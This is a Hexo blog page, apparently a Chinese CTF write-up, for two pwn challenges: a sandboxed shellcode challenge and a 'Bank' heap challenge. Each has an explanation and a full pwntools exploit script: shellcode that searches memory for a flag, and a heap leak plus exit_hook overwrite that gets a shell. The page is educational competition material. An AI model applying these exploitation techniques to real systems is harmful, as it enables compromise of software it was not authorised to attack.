@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a2ur2.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="这次蓝帽跟着fallw1nd师傅一起，摸进了半决，希望能顺利去一次线下捏qwq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Game[1]蓝帽杯初赛wp-pwn">
+<meta property="og:url" content="https://a2ur2.github.io/2022/09/20/Game[1]%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/index.html">
+<meta property="og:site_name" content="A2ur2的梦想小屋">
+<meta property="og:description" content="这次蓝帽跟着fallw1nd师傅一起，摸进了半决，希望能顺利去一次线下捏qwq">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/07/20/jbpxu6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/07/20/jb9CUe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/07/20/jb9AgI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/07/20/jb90PJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/07/20/jbCZW9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/07/20/jbPYAU.png">
+<meta property="article:published_time" content="2022-09-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-24T12:02:38.271Z">
+<meta property="article:author" content="A2ur2">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/07/20/jbpxu6.png">
+
+<link rel="canonical" href="https://a2ur2.github.io/2022/09/20/Game[1]%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Game[1]蓝帽杯初赛wp-pwn | A2ur2的梦想小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">A2ur2的梦想小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我许下的愿望该向谁去说明</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/09/20/Game[1]%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="A2ur2">
+      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A2ur2的梦想小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Game[1]蓝帽杯初赛wp-pwn
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-20 00:00:00" itemprop="dateCreated datePublished" datetime="2022-09-20T00:00:00+08:00">2022-09-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-24 20:02:38" itemprop="dateModified" datetime="2022-12-24T20:02:38+08:00">2022-12-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这次蓝帽跟着fallw1nd师傅一起，摸进了半决，希望能顺利去一次线下捏qwq</p>
+<span id="more"></span>
+
+<h2 id="pwn1-escapeshellcode"><a href="#pwn1-escapeshellcode" class="headerlink" title="pwn1-escapeshellcode"></a>pwn1-escapeshellcode</h2><h3 id="1、程序逻辑："><a href="#1、程序逻辑：" class="headerlink" title="1、程序逻辑："></a>1、程序逻辑：</h3><p>程序main函数如下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jbpxu6"><img src="https://s1.ax1x.com/2022/07/20/jbpxu6.png" alt="jbpxu6.png"></a></p>
+<p> 开了沙箱禁用了 syscall 。在 mem 的函数里，调用了 <strong>mtprotect</strong> 函数，让 malloc 出来的区域具有 rwx 权（这也是利用setcontext去orw的一个重要函数）</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jb9CUe"><img src="https://s1.ax1x.com/2022/07/20/jb9CUe.png" alt="jb9CUe.png"></a></p>
+<p>在init_flag函数内将当地一个flag读入到程序内存中，储存在bss段</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jb9AgI"><img src="https://s1.ax1x.com/2022/07/20/jb9AgI.png" alt="jb9AgI.png"></a></p>
+<p>最后给了一次执行shellcode的机会，但是在执行我们自身的shellcode前，程序会将出了rip之外的寄存器全部设置成0xdeadbeef，所以我们不能用push和pop去还原寄存器（因为这两个都需要对栈帧进行操作，但是我们的栈帧寄存器也寄了，所以用push和pop就会出错），所以我们可以用jmp或者lea（这里用lea是因为有一个堆地址在rip中）</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jb90PJ"><img src="https://s1.ax1x.com/2022/07/20/jb90PJ.png" alt="jb90PJ.png"></a></p>
+<h3 id="2、解题思路："><a href="#2、解题思路：" class="headerlink" title="2、解题思路："></a>2、解题思路：</h3><p>利用rip寄存器中残留的堆地址，逐段逐段的爆破bss段地址，最后加上偏移拿到flag的地址，系统调用write打印</p>
+<h3 id="3、exp"><a href="#3、exp" class="headerlink" title="3、exp"></a>3、exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;39.107.108.120&#x27;</span>,<span class="number">15546</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./orw&#x27;)</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">lea rsi, [rip-0x600000]</span></span><br><span class="line"><span class="string">and rsi, 0xfffffffff0000000</span></span><br><span class="line"><span class="string">mov edx, 0x50</span></span><br><span class="line"><span class="string">L1:</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">add rsi, 0x1000</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">test eax, eax</span></span><br><span class="line"><span class="string">jng L1</span></span><br><span class="line"><span class="string">add rsi, 0x4120</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">p.send(sc)</span><br><span class="line"><span class="comment">#a=p.recv()</span></span><br><span class="line"><span class="comment">#print(hex(a))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn2-Bank"><a href="#pwn2-Bank" class="headerlink" title="pwn2-Bank"></a>pwn2-Bank</h2><p>这题赛中没做出来orz，当时从0开始的手搓shellcode去orw花费了一天（我太菜了</p>
+<h2 id="1、程序逻辑：-1"><a href="#1、程序逻辑：-1" class="headerlink" title="1、程序逻辑："></a>1、程序逻辑：</h2><p>模拟了一个银行，在deposit功能中存在漏洞，可以刷钱。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jbCZW9"><img src="https://s1.ax1x.com/2022/07/20/jbCZW9.png" alt="jbCZW9.png"></a></p>
+<p>在transfer功能中，根据transefer的用户不同，会有不同的操作</p>
+<p>guest：malloc出一个size为0x21的chunk，并且能写入0x10大小的data</p>
+<p>admin：从qword_203050这个地方的值开始偏移（这个偏移是你transfer的数量*8）去读，这里存的是一个堆地址，因此可以越界读堆内的内容</p>
+<p>hacker：任意地址free</p>
+<p>ghost：realloc</p>
+<p>abyss：一次任意地址写，并且有exit（0）</p>
+<h3 id="2、解题思路"><a href="#2、解题思路" class="headerlink" title="2、解题思路"></a>2、解题思路</h3><p>首先利用realloc释放一个堆块进入tcache，利用admin越界读出这个tcache bins的key字段，得到堆地址。这里要注意我们需要先抬高这个tcache的位置，因为transfer给admin的数值不能太小，所以如果我们直接整tcache，输入的数值会过小导致无法读出。</p>
+<p>然后malloc一个堆块，data区伪造成一个大小合适的chunk头，任意地址free掉它，让它进入unsorted bin。这里也要注意，在free中，操作系统会将check这个地址+size的地方是不是一个合法的chunk头，如果不是就会报错，所以我们需要再抬高，并且在对应位置伪造出一个chunk头。这里我们就能拿到libc基址</p>
+<p>最后abyss这里，写exit_hook然后程序退出，成功getshell</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jbPYAU"><img src="https://s1.ax1x.com/2022/07/20/jbPYAU.png" alt="jbPYAU.png"></a></p>
+<p><strong>小tips：</strong>如果本机是2.31的最新版本，这题打exit_hook是会寄的，因为那个段不可写orz，建议patch它给的libc</p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Click:&quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">card,pasw</span>):</span><br><span class="line">    menu(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(card))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(pasw))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="string">&quot;Put&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How Much?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deposit</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="string">&quot;Deposit&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How Much?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc_one</span>(<span class="params">data</span>):</span><br><span class="line">    menu(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;who?&quot;</span>,<span class="string">&quot;guest&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much? &quot;</span>,<span class="string">&quot;10&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc_ptr</span>(<span class="params">size</span>):</span><br><span class="line">    menu(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;who?&quot;</span>,<span class="string">&quot;ghost&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;ghost: &amp;^%$#@!   :)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_sth</span>(<span class="params">pad</span>):</span><br><span class="line">    menu(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;who?&quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(pad))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_exit</span>(<span class="params">ptr</span>):</span><br><span class="line">    menu(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;who?&quot;</span>,<span class="string">&quot;abyss&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.send(ptr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Log</span>(<span class="params">name</span>):</span><br><span class="line">    log.success(name+<span class="string">&#x27; = &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">eval</span>(name)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">richman</span>(<span class="params">num</span>):</span><br><span class="line">    </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">     put(num)</span><br><span class="line">     deposit(num)</span><br><span class="line">     put(num)</span><br><span class="line">     num*=<span class="number">2</span></span><br><span class="line">   <span class="keyword">return</span> num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">addr</span>):</span><br><span class="line">   menu(<span class="string">&quot;Transfer&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;who?&quot;</span>,<span class="string">&quot;hacker&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;60&quot;</span>)</span><br><span class="line">   <span class="comment">#gdb.attach(p)  </span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;hacker: Great!&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">Login(<span class="number">2315125</span>,<span class="number">235413</span>)</span><br><span class="line">cash=<span class="number">0x190</span></span><br><span class="line">richman(cash)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   malloc_one(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">realloc_ptr(<span class="number">0x10</span>)</span><br><span class="line">malloc_one(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">realloc_ptr(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show_sth(<span class="number">0x148</span>/<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I think &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; is&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="comment">#heap_add=leakadd-b&#x27;0x10&#x27;</span></span><br><span class="line">Log(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc_one(<span class="string">&quot;1072&quot;</span>)</span><br><span class="line">malloc_one(p64(<span class="number">0</span>)+p64(<span class="number">0x441</span>))</span><br><span class="line"></span><br><span class="line">malloc_one(<span class="string">&quot;aaaaa&quot;</span>)</span><br><span class="line">malloc_one(<span class="string">b&quot;x &quot;</span>)</span><br><span class="line">unsorted=heap_addr+<span class="number">0x458</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(unsorted))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">   malloc_one(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(heap_addr+<span class="number">0x470</span>)</span><br><span class="line">show_sth(<span class="number">0x1d0</span>/<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;I think &quot;</span>)</span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; is&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)-<span class="number">0x1ebbe0</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">Log(<span class="string">&quot;libcbase&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(heap_addr+<span class="number">0x2a0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">malloc_one(p64(libcbase+<span class="number">0x222f70</span>)*<span class="number">2</span>)</span><br><span class="line">og=[<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">my_exit(<span class="built_in">str</span>(libcbase+og[<span class="number">0</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/16/%E5%8A%AA%E5%8A%9B%E6%88%90%E9%95%BF%E7%9A%84pwn%E5%BC%9F%E7%B3%BB%E5%88%97%E3%80%904%E3%80%91-%E8%B1%AA%E6%92%95%E6%AC%A7%E7%AC%A6%E5%8D%A1%E7%89%B9%EF%BC%88house%20of%20cat/" rel="prev" title="努力成长的pwn弟系列【4】-豪撕欧符卡特（house of cat">
+      <i class="fa fa-chevron-left"></i> 努力成长的pwn弟系列【4】-豪撕欧符卡特（house of cat
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/09/28/about-system/" rel="next" title="about system">
+      about system <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-escapeshellcode"><span class="nav-number">1.</span> <span class="nav-text">pwn1-escapeshellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">1、程序逻辑：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">2、解题思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81exp"><span class="nav-number">1.3.</span> <span class="nav-text">3、exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-Bank"><span class="nav-number">2.</span> <span class="nav-text">pwn2-Bank</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%EF%BC%9A-1"><span class="nav-number">3.</span> <span class="nav-text">1、程序逻辑：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">3.1.</span> <span class="nav-text">2、解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">exp：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">A2ur2</p>
+  <div class="site-description" itemprop="description">在成为大赛pwn题签到员的路上</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">A2ur2</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
